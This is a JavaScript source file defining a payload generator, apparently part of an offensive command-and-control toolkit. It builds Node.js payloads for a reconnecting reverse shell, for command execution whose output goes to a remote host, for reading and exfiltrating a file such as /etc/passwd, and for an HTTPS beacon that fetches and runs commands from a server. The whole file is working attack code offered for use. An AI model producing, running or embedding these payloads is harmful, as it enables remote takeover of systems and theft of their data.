class PayloadTemplate {
  generate(config) {
    const host = config.host || '127.0.0.1';
    const port = config.port || 4443;
    const beacon = config.beacon || 60;
    const template = config.template || 'auto';
    const command = config.command || 'whoami';
    const filePath = config.file || '/etc/passwd';

    if (template === 'command-exec') {
      return this.commandExec(host, port, command);
    }
    if (template === 'file-exfil') {
      return this.fileExfil(host, port, filePath);
    }
    if (template === 'beacon' || config.protocol === 'https') {
      return this.beacon(host, port, beacon);
    }

    return this.reverseShell(host, port);
  }

  reverseShell(host, port) {
    return `(function(){var m=require('net');var c=m.createConnection(${port},'${host}',function(){process.stdin.pipe(c);c.pipe(process.stdout)});c.on('error',function(){});c.on('close',function(){setTimeout(function(){var c2=m.createConnection(${port},'${host}',function(){process.stdin.pipe(c2);c2.pipe(process.stdout)});c2.on('error',function(){})},5000)})})();`;
  }

  commandExec(host, port, command) {
    const escaped = command.replace(/'/g, "\\'");
    return `(function(){var cp=require('child_process');cp.exec('${escaped}',function(e,o,s){var n=require('net');var c=n.createConnection(${port},'${host}',function(){c.write(JSON.stringify({stdout:o,stderr:s,error:e?e.message:null}));c.end()});c.on('error',function(){})});})();`;
  }

  fileExfil(host, port, filePath) {
    const escaped = filePath.replace(/'/g, "\\'");
    return `(function(){var fs=require('fs');fs.readFile('${escaped}',function(e,d){if(e)return;var n=require('net');var c=n.createConnection(${port},'${host}',function(){c.write(JSON.stringify({file:d.toString('base64'),path:'${escaped}'}));c.end()});c.on('error',function(){})});})();`;
  }

  beacon(host, port, interval) {
    return `(function(){var p=require('https');function b(){var r=p.request({hostname:'${host}',port:${port},path:'/',method:'GET'},function(res){var d='';res.on('data',function(c){d+=c});res.on('end',function(){if(d.length>0){try{var cmd=JSON.parse(d).command;if(cmd){var cp=require('child_process');cp.exec(cmd,function(e,o,s){var r2=p.request({hostname:'${host}',port:${port},path:'/',method:'POST'},function(){});r2.end(JSON.stringify({output:o,error:e?e.message:null}))})}}catch(ex){}}setTimeout(b,${interval*1000})})});r.on('error',function(){setTimeout(b,${interval*1000})});r.end()}b()})();`;
  }
}

module.exports = PayloadTemplate;
